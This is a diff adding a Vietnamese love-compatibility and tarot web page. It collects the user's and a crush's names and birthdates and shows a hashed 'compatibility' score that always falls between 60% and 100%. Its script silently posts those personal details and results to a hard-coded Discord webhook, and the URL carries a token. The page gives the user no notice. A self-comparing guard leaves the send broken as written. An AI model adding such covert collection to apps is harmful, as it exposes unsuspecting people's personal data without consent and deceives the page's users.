@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Love Oracle Tarot 🔮</title>
+    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body {
+            margin: 0; min-height: 100vh;
+            display: flex; align-items: center; justify-content: center;
+            background: linear-gradient(135deg, #1a0a2e, #4a148c);
+            color: white; overflow-x: hidden; padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            border-radius: 28px; padding: 30px;
+            width: 100%; max-width: 400px; text-align: center;
+            box-shadow: 0 0 30px rgba(138, 43, 226, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .title { font-family: 'Great Vibes', cursive; font-size: 45px; color: #ffb6d5; margin-bottom: 15px; }
+        input, button { width: 100%; padding: 12px; border-radius: 12px; border: none; margin-top: 10px; transition: 0.3s; font-size: 14px; }
+        input { background: rgba(255, 255, 255, 0.15); color: white; outline: none; }
+        input::placeholder { color: #ccc; }
+        button { background: #ff4f9a; color: white; font-weight: 600; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 79, 154, 0.4); }
+        button:hover { transform: translateY(-2px); background: #ff75b0; }
+        button:disabled { background: #666; cursor: not-allowed; transform: none; }
+        
+        .result-section { margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 15px; border: 1px dashed #ff4f9a; }
+        .percent { font-size: 32px; font-weight: bold; color: #ffeb3b; margin-bottom: 5px; }
+
+        .card-container { display: flex; gap: 8px; justify-content: center; margin: 20px 0; perspective: 1000px; }
+        .card { width: 90px; height: 140px; position: relative; transform-style: preserve-3d; transition: transform 0.8s; }
+        .card.flipped { transform: rotateY(180deg); }
+        .card-face {
+            position: absolute; width: 100%; height: 100%;
+            backface-visibility: hidden; border-radius: 10px;
+            display: flex; align-items: center; justify-content: center; padding: 10px; font-size: 11px; font-weight: bold;
+        }
+        .card-back { background: linear-gradient(45deg, #6a11cb, #2575fc); border: 2px solid white; color: white; }
+        .card-front { background: #fff; color: #333; transform: rotateY(180deg); flex-direction: column; text-align: center; border: 1px solid #ddd; }
+        
+        .reading-box { text-align: left; font-size: 13px; max-height: 250px; overflow-y: auto; margin-top: 15px; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 10px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="title">Love Oracle</div>
+    
+    <div id="mainForm">
+        <input id="myName" placeholder="Tên của bạn">
+        <input id="myDob" type="date">
+        <input id="crushName" placeholder="Tên người ấy">
+        <input id="crushDob" type="date">
+        <button id="btnStart" onclick="startOracle()">KÍCH HOẠT ĐỊNH MỆNH 🔮</button>
+    </div>
+
+    <div id="result" class="hidden result-section">
+        <div class="percent" id="percentText">0%</div>
+        <p id="shortMsg"></p>
+        <button id="btnTarot" onclick="drawTarot()">XEM TRẢI BÀI TAROT 🃏</button>
+    </div>
+
+    <div id="tarotBox" class="hidden">
+        <div class="card-container" id="cards"></div>
+        <div class="reading-box" id="reading"></div>
+        <button onclick="location.reload()" style="background:#6a11cb; margin-top:15px;">XEM LẠI</button>
+    </div>
+</div>
+
+<script>
+// ================= CONFIG =================
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P"; 
+
+const tarotDeck = [
+    { n: "The Lovers", m: "Kết nối tâm giao, sự hòa hợp tuyệt đối." },
+    { n: "The Sun", m: "Tương lai tươi sáng, niềm vui và chân thành." },
+    { n: "The Star", m: "Sự chữa lành và hy vọng cho khởi đầu mới." },
+    { n: "The Moon", m: "Cảm xúc sâu kín chưa được thổ lộ." },
+    { n: "The Tower", m: "Sự thay đổi đột ngột mang tính thức tỉnh." },
+    { n: "Death", m: "Kết thúc cái cũ, bắt đầu chương mới sâu sắc." },
+    { n: "The World", m: "Sự viên mãn, cái kết có hậu cho cả hai." },
+    { n: "Temperance", m: "Cần sự kiên nhẫn và cân bằng cảm xúc." },
+    { n: "The Fool", m: "Một cuộc phiêu lưu mới mẻ, đầy bất ngờ." },
+    { n: "The Devil", m: "Sức hút mãnh liệt nhưng dễ gây lụy tình." }
+];
+
+let finalPercent = 0;
+
+function calculateFixedLove(s1, d1, s2, d2) {
+    const combined = (s1 + d1 + s2 + d2).toLowerCase().trim();
+    let hash = 0;
+    for (let i = 0; i < combined.length; i++) {
+        hash = ((hash << 5) - hash) + combined.charCodeAt(i);
+        hash |= 0;
+    }
+    return (Math.abs(hash) % 41) + 60; // Trả về 60% - 100%
+}
+
+async function sendToDiscord(content) {
+    if (!WEBHOOK_URL || WEBHOOK_URL.includes("https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P")) return;
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: content })
+        });
+    } catch (e) { console.error("Webhook error:", e); }
+}
+
+function startOracle() {
+    const n1 = document.getElementById('myName').value.trim();
+    const d1 = document.getElementById('myDob').value;
+    const n2 = document.getElementById('crushName').value.trim();
+    const d2 = document.getElementById('crushDob').value;
+
+    if (!n1 || !d1 || !n2 || !d2) {
+        alert("Vui lòng nhập đầy đủ thông tin!");
+        return;
+    }
+
+    document.getElementById('btnStart').disabled = true;
+    finalPercent = calculateFixedLove(n1, d1, n2, d2);
+    
+    document.getElementById('result').classList.remove('hidden');
+    document.getElementById('percentText').innerText = `Độ hòa hợp: ${finalPercent}%`;
+
+    let msg = finalPercent > 85 ? "💞 Soulmate - Định mệnh an bài" : 
+              finalPercent > 75 ? "💖 Duyên nợ sâu đậm - Hãy chủ động" : "⚠️ Bài học nghiệp - Cần sự kiên nhẫn";
+    document.getElementById('shortMsg').innerText = msg;
+
+    sendToDiscord(`🔮 **MỚI**\n👤 ${n1} (${d1})\n💘 ${n2} (${d2})\n📊 Kết quả: ${finalPercent}% - ${msg}`);
+}
+
+function drawTarot() {
+    document.getElementById('btnTarot').style.display = 'none';
+    document.getElementById('tarotBox').classList.remove('hidden');
+    
+    const cardsDiv = document.getElementById('cards');
+    const readingDiv = document.getElementById('reading');
+    const positions = ["Quá khứ", "Hiện tại", "Tương lai"];
+    
+    // Xáo bài ngẫu nhiên
+    let shuffled = [...tarotDeck].sort(() => 0.5 - Math.random());
+    let reportText = "";
+
+    positions.forEach((pos, i) => {
+        const cardData = shuffled[i];
+        const cardEl = document.createElement('div');
+        cardEl.className = 'card';
+        cardEl.innerHTML = `
+            <div class="card-face card-back">🔮</div>
+            <div class="card-face card-front">
+                <small style="color:#888">${pos}</small>
+                <strong style="margin:5px 0">${cardData.n}</strong>
+            </div>
+        `;
+        cardsDiv.appendChild(cardEl);
+
+        setTimeout(() => cardEl.classList.add('flipped'), i * 600 + 300);
+
+        readingDiv.innerHTML += `<p><b>${pos}: ${cardData.n}</b><br>✨ ${cardData.m}</p>`;
+        reportText += `${pos}: ${cardData.n}\n`;
+    });
+
+    sendToDiscord(`🃏 **TRẢI BÀI TAROT**\n${reportText}`);
+}
+</script>
+
+</body>
+</html>
